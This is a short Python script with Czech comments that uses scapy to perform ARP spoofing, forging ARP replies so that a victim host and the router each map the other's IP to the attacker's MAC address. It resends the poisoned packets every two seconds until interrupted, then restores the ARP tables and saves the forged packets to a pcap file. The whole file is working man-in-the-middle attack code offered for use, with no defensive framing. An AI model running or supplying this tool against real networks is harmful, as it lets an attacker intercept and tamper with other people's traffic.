from scapy.all import ARP, wrpcap, sendp as s, Ether, get_if_hwaddr, conf
import time
# --- Hlavní funkce --- #
def spoof(target_ip, target_mac, router_ip, router_mac):
    # Získání vaší vlastní MAC adresy (útočník)
    vlastni_mac = get_if_hwaddr(conf.iface)

    # Vytvoření falešného ARP paketu
    # hwsrc=vlastni_mac říká: "Já jsem router/oběť, pošli to na tuhle MAC (mou)"
    arp_obet = Ether(dst=target_mac) / ARP(op=2, psrc=router_ip, hwsrc=vlastni_mac, pdst=target_ip, hwdst=target_mac)
    arp_router = Ether(dst=router_mac) / ARP(op=2, psrc=target_ip, hwsrc=vlastni_mac, pdst=router_ip, hwdst=router_mac)

    # Restore tabulek
    arp_obet_restore = Ether(dst=target_mac) / ARP(op=2, psrc=router_ip, hwsrc=router_mac, pdst=target_ip, hwdst=target_mac)
    arp_router_restore = Ether(dst=router_mac) / ARP(op=2, psrc=target_ip, hwsrc=target_mac, pdst=router_ip, hwdst=router_mac)

    packet_list = []

    try: 
        print(f"Sending spoofed ARP packets to {target_ip} and {router_ip}... (Press Ctrl+C to stop)")
        while True:
            s(arp_obet, verbose=False)
            packet_list.append(arp_obet)
            
            s(arp_router, verbose=False)
            packet_list.append(arp_router)
            
            time.sleep(2)

    except KeyboardInterrupt:   
        print("Stopping ARP spoofing and restoring network...")
        # Odeslání správných ARP paketů pro obnovení sítě
        s(arp_obet_restore, verbose=False, count=5)
        s(arp_router_restore, verbose=False, count=5)

        print("Network restored. Program terminated.")
        wrpcap("capture.pcap", packet_list)
        # Uložení komunikace do .pcap souboru